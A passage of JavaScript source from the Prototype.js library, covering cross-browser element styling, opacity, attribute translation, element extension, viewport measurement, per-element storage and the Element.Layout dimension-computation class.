        element.removeChild(node);
      node = nextNode;
    }
    return element;
  },

  empty: function(element) {
    return $(element).innerHTML.blank();
  },

  descendantOf: function(element, ancestor) {
    element = $(element), ancestor = $(ancestor);

    if (element.compareDocumentPosition)
      return (element.compareDocumentPosition(ancestor) & 8) === 8;

    if (ancestor.contains)
      return ancestor.contains(element) && ancestor !== element;

    while (element = element.parentNode)
      if (element == ancestor) return true;

    return false;
  },

  scrollTo: function(element) {
    element = $(element);
    var pos = Element.cumulativeOffset(element);
    window.scrollTo(pos[0], pos[1]);
    return element;
  },

  getStyle: function(element, style) {
    element = $(element);
    style = style == 'float' ? 'cssFloat' : style.camelize();
    var value = element.style[style];
    if (!value || value == 'auto') {
      var css = document.defaultView.getComputedStyle(element, null);
      value = css ? css[style] : null;
    }
    if (style == 'opacity') return value ? parseFloat(value) : 1.0;
    return value == 'auto' ? null : value;
  },

  getOpacity: function(element) {
    return $(element).getStyle('opacity');
  },

  setStyle: function(element, styles) {
    element = $(element);
    var elementStyle = element.style, match;
    if (Object.isString(styles)) {
      element.style.cssText += ';' + styles;
      return styles.include('opacity') ?
        element.setOpacity(styles.match(/opacity:\s*(\d?\.?\d*)/)[1]) : element;
    }
    for (var property in styles)
      if (property == 'opacity') element.setOpacity(styles[property]);
      else
        elementStyle[(property == 'float' || property == 'cssFloat') ?
          (Object.isUndefined(elementStyle.styleFloat) ? 'cssFloat' : 'styleFloat') :
            property] = styles[property];

    return element;
  },

  setOpacity: function(element, value) {
    element = $(element);
    element.style.opacity = (value == 1 || value === '') ? '' :
      (value < 0.00001) ? 0 : value;
    return element;
  },

  makePositioned: function(element) {
    element = $(element);
    var pos = Element.getStyle(element, 'position');
    if (pos == 'static' || !pos) {
      element._madePositioned = true;
      element.style.position = 'relative';
      if (Prototype.Browser.Opera) {
        element.style.top = 0;
        element.style.left = 0;
      }
    }
    return element;
  },

  undoPositioned: function(element) {
    element = $(element);
    if (element._madePositioned) {
      element._madePositioned = undefined;
      element.style.position =
        element.style.top =
        element.style.left =
        element.style.bottom =
        element.style.right = '';
    }
    return element;
  },

  makeClipping: function(element) {
    element = $(element);
    if (element._overflow) return element;
    element._overflow = Element.getStyle(element, 'overflow') || 'auto';
    if (element._overflow !== 'hidden')
      element.style.overflow = 'hidden';
    return element;
  },

  undoClipping: function(element) {
    element = $(element);
    if (!element._overflow) return element;
    element.style.overflow = element._overflow == 'auto' ? '' : element._overflow;
    element._overflow = null;
    return element;
  },

  clonePosition: function(element, source) {
    var options = Object.extend({
      setLeft:    true,
      setTop:     true,
      setWidth:   true,
      setHeight:  true,
      offsetTop:  0,
      offsetLeft: 0
    }, arguments[2] || { });

    source = $(source);
    var p = Element.viewportOffset(source), delta = [0, 0], parent = null;

    element = $(element);

    if (Element.getStyle(element, 'position') == 'absolute') {
      parent = Element.getOffsetParent(element);
      delta = Element.viewportOffset(parent);
    }

    if (parent == document.body) {
      delta[0] -= document.body.offsetLeft;
      delta[1] -= document.body.offsetTop;
    }

    if (options.setLeft)   element.style.left  = (p[0] - delta[0] + options.offsetLeft) + 'px';
    if (options.setTop)    element.style.top   = (p[1] - delta[1] + options.offsetTop) + 'px';
    if (options.setWidth)  element.style.width = source.offsetWidth + 'px';
    if (options.setHeight) element.style.height = source.offsetHeight + 'px';
    return element;
  }
};

Object.extend(Element.Methods, {
  getElementsBySelector: Element.Methods.select,

  childElements: Element.Methods.immediateDescendants
});

Element._attributeTranslations = {
  write: {
    names: {
      className: 'class',
      htmlFor:   'for'
    },
    values: { }
  }
};

if (Prototype.Browser.Opera) {
  Element.Methods.getStyle = Element.Methods.getStyle.wrap(
    function(proceed, element, style) {
      switch (style) {
        case 'height': case 'width':
          if (!Element.visible(element)) return null;

          var dim = parseInt(proceed(element, style), 10);

          if (dim !== element['offset' + style.capitalize()])
            return dim + 'px';

          var properties;
          if (style === 'height') {
            properties = ['border-top-width', 'padding-top',
             'padding-bottom', 'border-bottom-width'];
          }
          else {
            properties = ['border-left-width', 'padding-left',
             'padding-right', 'border-right-width'];
          }
          return properties.inject(dim, function(memo, property) {
            var val = proceed(element, property);
            return val === null ? memo : memo - parseInt(val, 10);
          }) + 'px';
        default: return proceed(element, style);
      }
    }
  );

  Element.Methods.readAttribute = Element.Methods.readAttribute.wrap(
    function(proceed, element, attribute) {
      if (attribute === 'title') return element.title;
      return proceed(element, attribute);
    }
  );
}

else if (Prototype.Browser.IE) {
  Element.Methods.getStyle = function(element, style) {
    element = $(element);
    style = (style == 'float' || style == 'cssFloat') ? 'styleFloat' : style.camelize();
    var value = element.style[style];
    if (!value && element.currentStyle) value = element.currentStyle[style];

    if (style == 'opacity') {
      if (value = (element.getStyle('filter') || '').match(/alpha\(opacity=(.*)\)/))
        if (value[1]) return parseFloat(value[1]) / 100;
      return 1.0;
    }

    if (value == 'auto') {
      if ((style == 'width' || style == 'height') && (element.getStyle('display') != 'none'))
        return element['offset' + style.capitalize()] + 'px';
      return null;
    }
    return value;
  };

  Element.Methods.setOpacity = function(element, value) {
    function stripAlpha(filter){
      return filter.replace(/alpha\([^\)]*\)/gi,'');
    }
    element = $(element);
    var currentStyle = element.currentStyle;
    if ((currentStyle && !currentStyle.hasLayout) ||
      (!currentStyle && element.style.zoom == 'normal'))
        element.style.zoom = 1;

    var filter = element.getStyle('filter'), style = element.style;
    if (value == 1 || value === '') {
      (filter = stripAlpha(filter)) ?
        style.filter = filter : style.removeAttribute('filter');
      return element;
    } else if (value < 0.00001) value = 0;
    style.filter = stripAlpha(filter) +
      'alpha(opacity=' + (value * 100) + ')';
    return element;
  };

  Element._attributeTranslations = (function(){

    var classProp = 'className',
        forProp = 'for',
        el = document.createElement('div');

    el.setAttribute(classProp, 'x');

    if (el.className !== 'x') {
      el.setAttribute('class', 'x');
      if (el.className === 'x') {
        classProp = 'class';
      }
    }
    el = null;

    el = document.createElement('label');
    el.setAttribute(forProp, 'x');
    if (el.htmlFor !== 'x') {
      el.setAttribute('htmlFor', 'x');
      if (el.htmlFor === 'x') {
        forProp = 'htmlFor';
      }
    }
    el = null;

    return {
      read: {
        names: {
          'class':      classProp,
          'className':  classProp,
          'for':        forProp,
          'htmlFor':    forProp
        },
        values: {
          _getAttr: function(element, attribute) {
            return element.getAttribute(attribute);
          },
          _getAttr2: function(element, attribute) {
            return element.getAttribute(attribute, 2);
          },
          _getAttrNode: function(element, attribute) {
            var node = element.getAttributeNode(attribute);
            return node ? node.value : "";
          },
          _getEv: (function(){

            var el = document.createElement('div'), f;
            el.onclick = Prototype.emptyFunction;
            var value = el.getAttribute('onclick');

            if (String(value).indexOf('{') > -1) {
              f = function(element, attribute) {
                attribute = element.getAttribute(attribute);
                if (!attribute) return null;
                attribute = attribute.toString();
                attribute = attribute.split('{')[1];
                attribute = attribute.split('}')[0];
                return attribute.strip();
              };
            }
            else if (value === '') {
              f = function(element, attribute) {
                attribute = element.getAttribute(attribute);
                if (!attribute) return null;
                return attribute.strip();
              };
            }
            el = null;
            return f;
          })(),
          _flag: function(element, attribute) {
            return $(element).hasAttribute(attribute) ? attribute : null;
          },
          style: function(element) {
            return element.style.cssText.toLowerCase();
          },
          title: function(element) {
            return element.title;
          }
        }
      }
    }
  })();

  Element._attributeTranslations.write = {
    names: Object.extend({
      cellpadding: 'cellPadding',
      cellspacing: 'cellSpacing'
    }, Element._attributeTranslations.read.names),
    values: {
      checked: function(element, value) {
        element.checked = !!value;
      },

      style: function(element, value) {
        element.style.cssText = value ? value : '';
      }
    }
  };

  Element._attributeTranslations.has = {};

  $w('colSpan rowSpan vAlign dateTime accessKey tabIndex ' +
      'encType maxLength readOnly longDesc frameBorder').each(function(attr) {
    Element._attributeTranslations.write.names[attr.toLowerCase()] = attr;
    Element._attributeTranslations.has[attr.toLowerCase()] = attr;
  });

  (function(v) {
    Object.extend(v, {
      href:        v._getAttr2,
      src:         v._getAttr2,
      type:        v._getAttr,
      action:      v._getAttrNode,
      disabled:    v._flag,
      checked:     v._flag,
      readonly:    v._flag,
      multiple:    v._flag,
      onload:      v._getEv,
      onunload:    v._getEv,
      onclick:     v._getEv,
      ondblclick:  v._getEv,
      onmousedown: v._getEv,
      onmouseup:   v._getEv,
      onmouseover: v._getEv,
      onmousemove: v._getEv,
      onmouseout:  v._getEv,
      onfocus:     v._getEv,
      onblur:      v._getEv,
      onkeypress:  v._getEv,
      onkeydown:   v._getEv,
      onkeyup:     v._getEv,
      onsubmit:    v._getEv,
      onreset:     v._getEv,
      onselect:    v._getEv,
      onchange:    v._getEv
    });
  })(Element._attributeTranslations.read.values);

  if (Prototype.BrowserFeatures.ElementExtensions) {
    (function() {
      function _descendants(element) {
        var nodes = element.getElementsByTagName('*'), results = [];
        for (var i = 0, node; node = nodes[i]; i++)
          if (node.tagName !== "!") // Filter out comment nodes.
            results.push(node);
        return results;
      }

      Element.Methods.down = function(element, expression, index) {
        element = $(element);
        if (arguments.length == 1) return element.firstDescendant();
        return Object.isNumber(expression) ? _descendants(element)[expression] :
          Element.select(element, expression)[index || 0];
      }
    })();
  }

}

else if (Prototype.Browser.Gecko && /rv:1\.8\.0/.test(navigator.userAgent)) {
  Element.Methods.setOpacity = function(element, value) {
    element = $(element);
    element.style.opacity = (value == 1) ? 0.999999 :
      (value === '') ? '' : (value < 0.00001) ? 0 : value;
    return element;
  };
}

else if (Prototype.Browser.WebKit) {
  Element.Methods.setOpacity = function(element, value) {
    element = $(element);
    element.style.opacity = (value == 1 || value === '') ? '' :
      (value < 0.00001) ? 0 : value;

    if (value == 1)
      if (element.tagName.toUpperCase() == 'IMG' && element.width) {
        element.width++; element.width--;
      } else try {
        var n = document.createTextNode(' ');
        element.appendChild(n);
        element.removeChild(n);
      } catch (e) { }

    return element;
  };
}

if ('outerHTML' in document.documentElement) {
  Element.Methods.replace = function(element, content) {
    element = $(element);

    if (content && content.toElement) content = content.toElement();
    if (Object.isElement(content)) {
      element.parentNode.replaceChild(content, element);
      return element;
    }

    content = Object.toHTML(content);
    var parent = element.parentNode, tagName = parent.tagName.toUpperCase();

    if (Element._insertionTranslations.tags[tagName]) {
      var nextSibling = element.next(),
          fragments = Element._getContentFromAnonymousElement(tagName, content.stripScripts());
      parent.removeChild(element);
      if (nextSibling)
        fragments.each(function(node) { parent.insertBefore(node, nextSibling) });
      else
        fragments.each(function(node) { parent.appendChild(node) });
    }
    else element.outerHTML = content.stripScripts();

    content.evalScripts.bind(content).defer();
    return element;
  };
}

Element._returnOffset = function(l, t) {
  var result = [l, t];
  result.left = l;
  result.top = t;
  return result;
};

Element._getContentFromAnonymousElement = function(tagName, html, force) {
  var div = new Element('div'),
      t = Element._insertionTranslations.tags[tagName];

  var workaround = false;
  if (t) workaround = true;
  else if (force) {
    workaround = true;
    t = ['', '', 0];
  }

  if (workaround) {
    div.innerHTML = '&nbsp;' + t[0] + html + t[1];
    div.removeChild(div.firstChild);
    for (var i = t[2]; i--; ) {
      div = div.firstChild;
    }
  }
  else {
    div.innerHTML = html;
  }
  return $A(div.childNodes);
};

Element._insertionTranslations = {
  before: function(element, node) {
    element.parentNode.insertBefore(node, element);
  },
  top: function(element, node) {
    element.insertBefore(node, element.firstChild);
  },
  bottom: function(element, node) {
    element.appendChild(node);
  },
  after: function(element, node) {
    element.parentNode.insertBefore(node, element.nextSibling);
  },
  tags: {
    TABLE:  ['<table>',                '</table>',                   1],
    TBODY:  ['<table><tbody>',         '</tbody></table>',           2],
    TR:     ['<table><tbody><tr>',     '</tr></tbody></table>',      3],
    TD:     ['<table><tbody><tr><td>', '</td></tr></tbody></table>', 4],
    SELECT: ['<select>',               '</select>',                  1]
  }
};

(function() {
  var tags = Element._insertionTranslations.tags;
  Object.extend(tags, {
    THEAD: tags.TBODY,
    TFOOT: tags.TBODY,
    TH:    tags.TD
  });
})();

Element.Methods.Simulated = {
  hasAttribute: function(element, attribute) {
    attribute = Element._attributeTranslations.has[attribute] || attribute;
    var node = $(element).getAttributeNode(attribute);
    return !!(node && node.specified);
  }
};

Element.Methods.ByTag = { };

Object.extend(Element, Element.Methods);

(function(div) {

  if (!Prototype.BrowserFeatures.ElementExtensions && div['__proto__']) {
    window.HTMLElement = { };
    window.HTMLElement.prototype = div['__proto__'];
    Prototype.BrowserFeatures.ElementExtensions = true;
  }

  div = null;

})(document.createElement('div'));

Element.extend = (function() {

  function checkDeficiency(tagName) {
    if (typeof window.Element != 'undefined') {
      var proto = window.Element.prototype;
      if (proto) {
        var id = '_' + (Math.random()+'').slice(2),
            el = document.createElement(tagName);
        proto[id] = 'x';
        var isBuggy = (el[id] !== 'x');
        delete proto[id];
        el = null;
        return isBuggy;
      }
    }
    return false;
  }

  function extendElementWith(element, methods) {
    for (var property in methods) {
      var value = methods[property];
      if (Object.isFunction(value) && !(property in element))
        element[property] = value.methodize();
    }
  }

  var HTMLOBJECTELEMENT_PROTOTYPE_BUGGY = checkDeficiency('object');

  if (Prototype.BrowserFeatures.SpecificElementExtensions) {
    if (HTMLOBJECTELEMENT_PROTOTYPE_BUGGY) {
      return function(element) {
        if (element && typeof element._extendedByPrototype == 'undefined') {
          var t = element.tagName;
          if (t && (/^(?:object|applet|embed)$/i.test(t))) {
            extendElementWith(element, Element.Methods);
            extendElementWith(element, Element.Methods.Simulated);
            extendElementWith(element, Element.Methods.ByTag[t.toUpperCase()]);
          }
        }
        return element;
      }
    }
    return Prototype.K;
  }

  var Methods = { }, ByTag = Element.Methods.ByTag;

  var extend = Object.extend(function(element) {
    if (!element || typeof element._extendedByPrototype != 'undefined' ||
        element.nodeType != 1 || element == window) return element;

    var methods = Object.clone(Methods),
        tagName = element.tagName.toUpperCase();

    if (ByTag[tagName]) Object.extend(methods, ByTag[tagName]);

    extendElementWith(element, methods);

    element._extendedByPrototype = Prototype.emptyFunction;
    return element;

  }, {
    refresh: function() {
      if (!Prototype.BrowserFeatures.ElementExtensions) {
        Object.extend(Methods, Element.Methods);
        Object.extend(Methods, Element.Methods.Simulated);
      }
    }
  });

  extend.refresh();
  return extend;
})();

if (document.documentElement.hasAttribute) {
  Element.hasAttribute = function(element, attribute) {
    return element.hasAttribute(attribute);
  };
}
else {
  Element.hasAttribute = Element.Methods.Simulated.hasAttribute;
}

Element.addMethods = function(methods) {
  var F = Prototype.BrowserFeatures, T = Element.Methods.ByTag;

  if (!methods) {
    Object.extend(Form, Form.Methods);
    Object.extend(Form.Element, Form.Element.Methods);
    Object.extend(Element.Methods.ByTag, {
      "FORM":     Object.clone(Form.Methods),
      "INPUT":    Object.clone(Form.Element.Methods),
      "SELECT":   Object.clone(Form.Element.Methods),
      "TEXTAREA": Object.clone(Form.Element.Methods),
      "BUTTON":   Object.clone(Form.Element.Methods)
    });
  }

  if (arguments.length == 2) {
    var tagName = methods;
    methods = arguments[1];
  }

  if (!tagName) Object.extend(Element.Methods, methods || { });
  else {
    if (Object.isArray(tagName)) tagName.each(extend);
    else extend(tagName);
  }

  function extend(tagName) {
    tagName = tagName.toUpperCase();
    if (!Element.Methods.ByTag[tagName])
      Element.Methods.ByTag[tagName] = { };
    Object.extend(Element.Methods.ByTag[tagName], methods);
  }

  function copy(methods, destination, onlyIfAbsent) {
    onlyIfAbsent = onlyIfAbsent || false;
    for (var property in methods) {
      var value = methods[property];
      if (!Object.isFunction(value)) continue;
      if (!onlyIfAbsent || !(property in destination))
        destination[property] = value.methodize();
    }
  }

  function findDOMClass(tagName) {
    var klass;
    var trans = {
      "OPTGROUP": "OptGroup", "TEXTAREA": "TextArea", "P": "Paragraph",
      "FIELDSET": "FieldSet", "UL": "UList", "OL": "OList", "DL": "DList",
      "DIR": "Directory", "H1": "Heading", "H2": "Heading", "H3": "Heading",
      "H4": "Heading", "H5": "Heading", "H6": "Heading", "Q": "Quote",
      "INS": "Mod", "DEL": "Mod", "A": "Anchor", "IMG": "Image", "CAPTION":
      "TableCaption", "COL": "TableCol", "COLGROUP": "TableCol", "THEAD":
      "TableSection", "TFOOT": "TableSection", "TBODY": "TableSection", "TR":
      "TableRow", "TH": "TableCell", "TD": "TableCell", "FRAMESET":
      "FrameSet", "IFRAME": "IFrame"
    };
    if (trans[tagName]) klass = 'HTML' + trans[tagName] + 'Element';
    if (window[klass]) return window[klass];
    klass = 'HTML' + tagName + 'Element';
    if (window[klass]) return window[klass];
    klass = 'HTML' + tagName.capitalize() + 'Element';
    if (window[klass]) return window[klass];

    var element = document.createElement(tagName),
        proto = element['__proto__'] || element.constructor.prototype;

    element = null;
    return proto;
  }

  var elementPrototype = window.HTMLElement ? HTMLElement.prototype :
   Element.prototype;

  if (F.ElementExtensions) {
    copy(Element.Methods, elementPrototype);
    copy(Element.Methods.Simulated, elementPrototype, true);
  }

  if (F.SpecificElementExtensions) {
    for (var tag in Element.Methods.ByTag) {
      var klass = findDOMClass(tag);
      if (Object.isUndefined(klass)) continue;
      copy(T[tag], klass.prototype);
    }
  }

  Object.extend(Element, Element.Methods);
  delete Element.ByTag;

  if (Element.extend.refresh) Element.extend.refresh();
  Element.cache = { };
};


document.viewport = {

  getDimensions: function() {
    return { width: this.getWidth(), height: this.getHeight() };
  },

  getScrollOffsets: function() {
    return Element._returnOffset(
      window.pageXOffset || document.documentElement.scrollLeft || document.body.scrollLeft,
      window.pageYOffset || document.documentElement.scrollTop  || document.body.scrollTop);
  }
};

(function(viewport) {
  var B = Prototype.Browser, doc = document, element, property = {};

  function getRootElement() {
    if (B.WebKit && !doc.evaluate)
      return document;

    if (B.Opera && window.parseFloat(window.opera.version()) < 9.5)
      return document.body;

    return document.documentElement;
  }

  function define(D) {
    if (!element) element = getRootElement();

    property[D] = 'client' + D;

    viewport['get' + D] = function() { return element[property[D]] };
    return viewport['get' + D]();
  }

  viewport.getWidth  = define.curry('Width');

  viewport.getHeight = define.curry('Height');
})(document.viewport);


Element.Storage = {
  UID: 1
};

Element.addMethods({
  getStorage: function(element) {
    if (!(element = $(element))) return;

    var uid;
    if (element === window) {
      uid = 0;
    } else {
      if (typeof element._prototypeUID === "undefined")
        element._prototypeUID = Element.Storage.UID++;
      uid = element._prototypeUID;
    }

    if (!Element.Storage[uid])
      Element.Storage[uid] = $H();

    return Element.Storage[uid];
  },

  store: function(element, key, value) {
    if (!(element = $(element))) return;

    if (arguments.length === 2) {
      Element.getStorage(element).update(key);
    } else {
      Element.getStorage(element).set(key, value);
    }

    return element;
  },

  retrieve: function(element, key, defaultValue) {
    if (!(element = $(element))) return;
    var hash = Element.getStorage(element), value = hash.get(key);

    if (Object.isUndefined(value)) {
      hash.set(key, defaultValue);
      value = defaultValue;
    }

    return value;
  },

  clone: function(element, deep) {
    if (!(element = $(element))) return;
    var clone = element.cloneNode(deep);
    clone._prototypeUID = void 0;
    if (deep) {
      var descendants = Element.select(clone, '*'),
          i = descendants.length;
      while (i--) {
        descendants[i]._prototypeUID = void 0;
      }
    }
    return Element.extend(clone);
  },

  purge: function(element) {
    if (!(element = $(element))) return;
    var purgeElement = Element._purgeElement;

    purgeElement(element);

    var descendants = element.getElementsByTagName('*'),
     i = descendants.length;

    while (i--) purgeElement(descendants[i]);

    return null;
  }
});

(function() {

  function toDecimal(pctString) {
    var match = pctString.match(/^(\d+)%?$/i);
    if (!match) return null;
    return (Number(match[1]) / 100);
  }

  function getPixelValue(value, property, context) {
    var element = null;
    if (Object.isElement(value)) {
      element = value;
      value = element.getStyle(property);
    }

    if (value === null) {
      return null;
    }

    if ((/^(?:-)?\d+(\.\d+)?(px)?$/i).test(value)) {
      return window.parseFloat(value);
    }

    var isPercentage = value.include('%'), isViewport = (context === document.viewport);

    if (/\d/.test(value) && element && element.runtimeStyle && !(isPercentage && isViewport)) {
      var style = element.style.left, rStyle = element.runtimeStyle.left;
      element.runtimeStyle.left = element.currentStyle.left;
      element.style.left = value || 0;
      value = element.style.pixelLeft;
      element.style.left = style;
      element.runtimeStyle.left = rStyle;

      return value;
    }

    if (element && isPercentage) {
      context = context || element.parentNode;
      var decimal = toDecimal(value);
      var whole = null;
      var position = element.getStyle('position');

      var isHorizontal = property.include('left') || property.include('right') ||
       property.include('width');

      var isVertical =  property.include('top') || property.include('bottom') ||
        property.include('height');

      if (context === document.viewport) {
        if (isHorizontal) {
          whole = document.viewport.getWidth();
        } else if (isVertical) {
          whole = document.viewport.getHeight();
        }
      } else {
        if (isHorizontal) {
          whole = $(context).measure('width');
        } else if (isVertical) {
          whole = $(context).measure('height');
        }
      }

      return (whole === null) ? 0 : whole * decimal;
    }

    return 0;
  }

  function toCSSPixels(number) {
    if (Object.isString(number) && number.endsWith('px')) {
      return number;
    }
    return number + 'px';
  }

  function isDisplayed(element) {
    var originalElement = element;
    while (element && element.parentNode) {
      var display = element.getStyle('display');
      if (display === 'none') {
        return false;
      }
      element = $(element.parentNode);
    }
    return true;
  }

  var hasLayout = Prototype.K;
  if ('currentStyle' in document.documentElement) {
    hasLayout = function(element) {
      if (!element.currentStyle.hasLayout) {
        element.style.zoom = 1;
      }
      return element;
    };
  }

  function cssNameFor(key) {
    if (key.include('border')) key = key + '-width';
    return key.camelize();
  }

  Element.Layout = Class.create(Hash, {
    initialize: function($super, element, preCompute) {
      $super();
      this.element = $(element);

      Element.Layout.PROPERTIES.each( function(property) {
        this._set(property, null);
      }, this);

      if (preCompute) {
        this._preComputing = true;
        this._begin();
        Element.Layout.PROPERTIES.each( this._compute, this );
        this._end();
        this._preComputing = false;
      }
    },

    _set: function(property, value) {
      return Hash.prototype.set.call(this, property, value);
    },

    set: function(property, value) {
      throw "Properties of Element.Layout are read-only.";
    },

    get: function($super, property) {
      var value = $super(property);
      return value === null ? this._compute(property) : value;
    },

    _begin: function() {
      if (this._prepared) return;

      var element = this.element;
      if (isDisplayed(element)) {
        this._prepared = true;
        return;
      }

      var originalStyles = {
        position:   element.style.position   || '',
        width:      element.style.width      || '',
        visibility: element.style.visibility || '',
        display:    element.style.display    || ''
      };

      element.store('prototype_original_styles', originalStyles);

      var position = element.getStyle('position'),
       width = element.getStyle('width');

      if (width === "0px" || width === null) {
        element.style.display = 'block';
        width = element.getStyle('width');
      }

      var context = (position === 'fixed') ? document.viewport :
       element.parentNode;

      element.setStyle({
        position:   'absolute',
        visibility: 'hidden',
        display:    'block'
      });

      var positionedWidth = element.getStyle('width');

      var newWidth;
      if (width && (positionedWidth === width)) {
        newWidth = getPixelValue(element, 'width', context);
      } else if (position === 'absolute' || position === 'fixed') {
        newWidth = getPixelValue(element, 'width', context);
      } else {
        var parent = element.parentNode, pLayout = $(parent).getLayout();

        newWidth = pLayout.get('width') -
         this.get('margin-left') -
         this.get('border-left') -
         this.get('padding-left') -
         this.get('padding-right') -
         this.get('border-right') -
         this.get('margin-right');
      }

      element.setStyle({ width: newWidth + 'px' });

      this._prepared = true;
    },

    _end: function() {
      var element = this.element;
      var originalStyles = element.retrieve('prototype_original_styles');
      element.store('prototype_original_styles', null);
      element.setStyle(originalStyles);
      this._prepared = false;
    },

    _compute: function(property) {
      var COMPUTATIONS = Element.Layout.COMPUTATIONS;
      if (!(property in COMPUTATIONS)) {
        throw "Property not found.";
      }

      return this._set(property, COMPUTATIONS[property].call(this, this.element));
    },

    toObject: function() {
      var args = $A(arguments);
      var keys = (args.length === 0) ? Element.Layout.PROPERTIES :
       args.join(' ').split(' ');
      var obj = {};
      keys.each( function(key) {
        if (!Element.Layout.PROPERTIES.include(key)) return;
        var value = this.get(key);
        if (value != null) obj[key] = value;
      }, this);
      return obj;
    },

    toHash: function() {
      var obj = this.toObject.apply(this, arguments);
      return new Hash(obj);
    },

    toCSS: function() {
      var args = $A(arguments);
      var keys = (args.length === 0) ? Element.Layout.PROPERTIES :
       args.join(' ').split(' ');
      var css = {};

      keys.each( function(key) {
        if (!Element.Layout.PROPERTIES.include(key)) return;
        if (Element.Layout.COMPOSITE_PROPERTIES.include(key)) return;

        var value = this.get(key);
        if (value != null) css[cssNameFor(key)] = value + 'px';
      }, this);
      return css;
    },

    inspect: function() {
      return "#<Element.Layout>";
    }
  });

  Object.extend(Element.Layout, {
    PROPERTIES: $w('height width top left right bottom border-left border-right border-top border-bottom padding-left padding-right padding-top padding-bottom margin-top margin-bottom margin-left margin-right padding-box-width padding-box-height border-box-width border-box-height margin-box-width margin-box-height'),

    COMPOSITE_PROPERTIES: $w('padding-box-width padding-box-height margin-box-width margin-box-height border-box-width border-box-height'),

    COMPUTATIONS: {
      'height': function(element) {
        if (!this._preComputing) this._begin();

        var bHeight = this.get('border-box-height');
        if (bHeight <= 0) {
          if (!this._preComputing) this._end();
          return 0;
        }

        var bTop = this.get('border-top'),
         bBottom = this.get('border-bottom');

        var pTop = this.get('padding-top'),
         pBottom = this.get('padding-bottom');

        if (!this._preComputing) this._end();

        return bHeight - bTop - bBottom - pTop - pBottom;
      },

      'width': function(element) {
        if (!this._preComputing) this._begin();

        var bWidth = this.get('border-box-width');
        if (bWidth <= 0) {
          if (!this._preComputing) this._end();
          return 0;
        }

        var bLeft = this.get('border-left'),
         bRight = this.get('border-right');

        var pLeft = this.get('padding-left'),
         pRight = this.get('padding-right');

        if (!this._preComputing) this._end();

        return bWidth - bLeft - bRight - pLeft - pRight;
      },

      'padding-box-height': function(element) {
        var height = this.get('height'),
         pTop = this.get('padding-top'),
         pBottom = this.get('padding-bottom');

        return height + pTop + pBottom;
      },

      'padding-box-width': function(element) {
        var width = this.get('width'),
         pLeft = this.get('padding-left'),
         pRight = this.get('padding-right');

        return width + pLeft + pRight;
      },

      'border-box-height': function(element) {
        if (!this._preComputing) this._begin();
        var height = element.offsetHeight;
        if (!this._preComputing) this._end();
        return height;
      },

      'border-box-width': function(element) {
        if (!this._preComputing) this._begin();
        var width = element.offsetWidth;
        if (!this._preComputing) this._end();
        return width;
      },

      'margin-box-height': function(element) {
        var bHeight = this.get('border-box-height'),
         mTop = this.get('margin-top'),
         mBottom = this.get('margin-bottom');

        if (bHeight <= 0) return 0;

        return bHeight + mTop + mBottom;
      },

      'margin-box-width': function(element) {
        var bWidth = this.get('border-box-width'),
         mLeft = this.get('margin-left'),
         mRight = this.get('margin-right');

        if (bWidth <= 0) return 0;

        return bWidth + mLeft + mRight;
      },

      'top': function(element) {
        var offset = element.positionedOffset();
        return offset.top;
      },

      'bottom': function(element) {
        var offset = element.positionedOffset(),
         parent = element.getOffsetParent(),
         pHeight = parent.measure('height');

        var mHeight = this.get('border-box-height');

        return pHeight - mHeight - offset.top;
      },

      'left': function(element) {
        var offset = element.positionedOffset();
        return offset.left;
      },

      'right': function(element) {
        var offset = element.positionedOffset(),
         parent = element.getOffsetParent(),
         pWidth = parent.measure('width');

        var mWidth = this.get('border-box-width');

        return pWidth - mWidth - offset.left;
      },

      'padding-top': function(element) {
        return getPixelValue(element, 'paddingTop');
      },

      'padding-bottom': function(element) {
        return getPixelValue(element, 'paddingBottom');
      },

      'padding-left': function(element) {
        return getPixelValue(element, 'paddingLeft');
      },

      'padding-right': function(element) {
        return getPixelValue(element, 'paddingRight');
      },

      'border-top': function(element) {
        return getPixelValue(element, 'borderTopWidth');
      },

      'border-bottom': function(element) {
        return getPixelValue(element, 'borderBottomWidth');
      },

      'border-left': function(element) {
        return getPixelValue(element, 'borderLeftWidth');
      },

      'border-right': function(element) {
        return getPixelValue(element, 'borderRightWidth');
      },

      'margin-top': function(element) {
        return getPixelValue(element, 'marginTop');
      },

      'margin-bottom': function(element) {
        return getPixelValue(element, 'marginBottom');
      },

      'margin-left': function(element) {
        return getPixelValue(element, 'marginLeft');
      },

      'margin-right': function(element) {
        return getPixelValue(element, 'marginRight');
      }
    }
  });

  if ('getBoundingClientRect' in document.documentElement) {
    Object.extend(Element.Layout.COMPUTATIONS, {
      'right': function(element) {
        var parent = hasLayout(element.getOffsetParent());
        var rect = element.getBoundingClientRect(),
         pRect = parent.getBoundingClientRect();

        return (pRect.right - rect.right).round();
      },

      'bottom': function(element) {
        var parent = hasLayout(element.getOffsetParent());
        var rect = element.getBoundingClientRect(),
         pRect = parent.getBoundingClientRect();

        return (pRect.bottom - rect.bottom).round();
      }
    });
  }

  Element.Offset = Class.create({
    initialize: function(left, top) {
      this.left = left.round();
      this.top  = top.round();

      this[0] = this.left;
      this[1] = this.top;
    },

    relativeTo: function(offset) {
      return new Element.Offset(
        this.left - offset.left,
        this.top  - offset.top
      );
    },

    inspect: function() {
      return "#<Element.Offset left: #{left} top: #{top}>".interpolate(this);
    },

    toString: function() {
      return "[#{left}, #{top}]".interpolate(this);
    },

    toArray: function() {
      return [this.left, this.top];
    }
  });

  function getLayout(element, preCompute) {
    return new Element.Layout(element, preCompute);
  }

  function measure(element, property) {
    return $(element).getLayout().get(property);
  }

  function getDimensions(element) {
    element = $(element);
    var display = Element.getStyle(element, 'display');

    if (display && display !== 'none') {
      return { width: element.offsetWidth, height: element.offsetHeight };
    }

    var style = element.style;
    var originalStyles = {
      visibility: style.visibility,
      position:   style.position,
      display:    style.display
    };

    var newStyles = {
      visibility: 'hidden',
      display:    'block'
    };

    if (originalStyles.position !== 'fixed')
      newStyles.position = 'absolute';

    Element.setStyle(element, newStyles);

    var dimensions = {
      width:  element.offsetWidth,
      height: element.offsetHeight
    };

    Element.setStyle(element, originalStyles);

    return dimensions;
  }

  function getOffsetParent(element) {
    element = $(element);

    if (isDocument(element) || isDetached(element) || isBody(element) || isHtml(element))
      return $(document.body);

    var isInline = (Element.getStyle(element, 'display') === 'inline');
    if (!isInline && element.offsetParent) return $(element.offsetParent);

    while ((element = element.parentNode) && element !== document.body) {
      if (Element.getStyle(element, 'position') !== 'static') {
        return isHtml(element) ? $(document.body) : $(element);
      }
    }

    return $(document.body);
  }


  function cumulativeOffset(element) {
    element = $(element);
    var valueT = 0, valueL = 0;
    if (element.parentNode) {
      do {
        valueT += element.offsetTop  || 0;
        valueL += element.offsetLeft || 0;
